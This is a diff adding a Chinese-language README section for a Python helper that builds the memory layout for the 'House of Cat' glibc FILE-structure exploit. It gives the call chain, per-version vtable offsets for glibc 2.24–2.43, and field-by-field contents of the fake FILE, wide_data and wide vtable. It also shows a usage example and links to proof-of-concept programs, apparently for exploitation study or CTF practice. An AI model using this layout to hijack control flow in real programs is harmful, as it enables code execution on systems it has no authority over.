@@ -69,6 +69,122 @@ _IO_OVERFLOW(fake, EOF)
 
 三个 PoC 都使用真实的 `_IO_wfile_jumps`，把 primary vtable 偏移合法的 `+0x30`，再调用 glibc 自带的 `__overflow` 走一遍 primary whitelist 校验；marker 回调返回 `WEOF`，最后用 assert 验证 wide 回调确实被执行了。
 
+## Python 离线板子
+
+[`cat.py`](./cat.py) 提供 `build_house_of_cat`，生成 House of Cat 最终触发点的对象布局。
+
+### 函数用途
+
+构造以下调用链所需的对象：
+
+```text
+__overflow(fp, EOF)
+  -> primary vtable = _IO_wfile_jumps + 0x30（合法 section 内错位）
+  -> _IO_wfile_seekoff
+  -> _IO_switch_to_wget_mode
+  -> fake wide_data->_wide_vtable->__overflow(fp, WEOF)
+  -> callback
+```
+
+### 对应 PoC
+
+- [`poc_wide_seekoff_2.24_2.29.c`](./poc_wide_seekoff_2.24_2.29.c)；
+- [`poc_wide_seekoff_2.30.c`](./poc_wide_seekoff_2.30.c)；
+- [`poc_wide_seekoff_2.31_2.43.c`](./poc_wide_seekoff_2.31_2.43.c)。
+
+### 版本与 ABI 偏移
+
+| glibc | `_wide_data->_wide_vtable` 偏移 |
+|---|---|
+| 2.24～2.29 | `+0x130` |
+| 2.30 | `+0xf0` |
+| 2.31～2.43 | `+0xe0` |
+
+primary vtable 使用 `_IO_wfile_jumps + 0x30`：
+
+```text
+seekoff 槽偏移 0x48
+overflow 槽偏移 0x18
+差值 = 0x30
+```
+
+fake wide vtable 的 `__overflow` 固定位于 `+0x18`。
+
+### 最小使用示例
+
+```python
+from cat import build_house_of_cat
+
+writes = build_house_of_cat(
+    "2.43",
+    file_addr=0x100000,           # fake FILE
+    fake_wide_data_addr=0x200000, # fake wide_data
+    fake_wide_vtable_addr=0x201000, # fake wide vtable
+    callback_addr=0x401234,       # wide __overflow 回调
+    wfile_jumps_addr=0x7fff0000,  # 合法 _IO_wfile_jumps
+)
+
+# 三个 MemoryWrite：FILE 镜像、wide_data、wide_vtable
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
+```
+
+### 参数
+
+| 参数 | 含义 |
+|---|---|
+| `version` | 目标 glibc 版本，支持 `2.24`～`2.43`。 |
+| `file_addr` | fake FILE 地址。 |
+| `fake_wide_data_addr` | fake `_IO_wide_data` 地址，写入 `FILE+0xa0`。 |
+| `fake_wide_vtable_addr` | fake wide vtable 地址，写入 fake wide_data 的版本对应槽位。 |
+| `callback_addr` | fake wide vtable `__overflow` 回调地址，写入 vtable `+0x18`。 |
+| `wfile_jumps_addr` | 目标 libc 的 `_IO_wfile_jumps` 地址；函数写入 `+0x30` 的错位 primary vtable。 |
+
+### 返回对象
+
+返回三个 `MemoryWrite`。`MemoryWrite` 每个成员含义：
+
+| 成员 | 含义 |
+|---|---|
+| `address` | 要写入的绝对地址。 |
+| `data` | 要写入的小端字节串（`bytes`）。 |
+| `label` | 该写入的用途标签，用于调试和识别。 |
+
+各写入内容：
+
+```text
+FILE（file_addr 处，0xe0 字节）：
+    +0xa0  _wide_data = fake_wide_data_addr
+    +0xc0  _mode = 1
+    +0xd8  vtable = wfile_jumps_addr + 0x30
+
+fake wide_data（fake_wide_data_addr 处）：
+    +0x18  _IO_write_base = 0
+    +0x20  _IO_write_ptr = 1（保证 write_ptr > write_base）
+    +版本槽  _wide_vtable = fake_wide_vtable_addr
+
+fake wide_vtable（fake_wide_vtable_addr 处）：
+    +0x18  __overflow = callback_addr
+```
+
+### 调用者必须提供
+
+```text
+libc 基址和 _IO_wfile_jumps 地址
+能投递 fake FILE / 覆盖现有 FILE 的原语
+能触发 __overflow 的入口
+可写 lock、buffer、codecvt 对象（如果走完整 seekoff 分支）
+```
+
+### 函数不负责
+
+```text
+不把 fake FILE 挂到 _IO_list_all
+不负责 largebin / stderr 等投递原语
+不触发 __overflow
+不处理回调的调用约定和 RCE/ORW 逻辑
+```
+
 ```bash
 ./tools/run_in_docker.sh 2.24 house_of_cat/poc_wide_seekoff_2.24_2.29.c
 ./tools/run_in_docker.sh 2.30 house_of_cat/poc_wide_seekoff_2.30.c
